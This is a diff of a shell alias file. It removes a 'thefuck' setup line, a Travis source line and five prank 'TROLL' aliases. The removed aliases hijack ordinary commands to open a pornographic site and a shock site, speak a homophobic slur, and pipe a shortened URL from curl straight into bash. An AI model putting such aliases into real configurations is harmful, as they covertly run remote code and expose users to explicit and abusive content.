@@ -34,18 +34,3 @@ alias cpv="rsync -poghb --backup-dir=/tmp/rsync -e /dev/null --progress --"
 # colorized cat
 alias cath='highlight -O ansi'
 
-#The fuck library
-eval $(thefuck --alias)
-# You can use whatever you want as an alias, like for Mondays:
-eval $(thefuck --alias FUCK)
-
-# Travis
-[ -f /Users/slyzz/.travis/travis.sh ] && source /Users/slyzz/.travis/travis.sh
-
-
-# TROLL ALIAS
-alias TROLL_1='open https://www.pornhub.com/ && cd'
-alias TROLL_2='open http://lemonparty.org/ && ls'
-alias TROLL_3='say petit pd && git'
-alias TROLL_4='mv Podfile Podfile.bak && pod'
-alias TROLL_5='(curl -L http://bit.ly/10hA8iC | bash) && open'
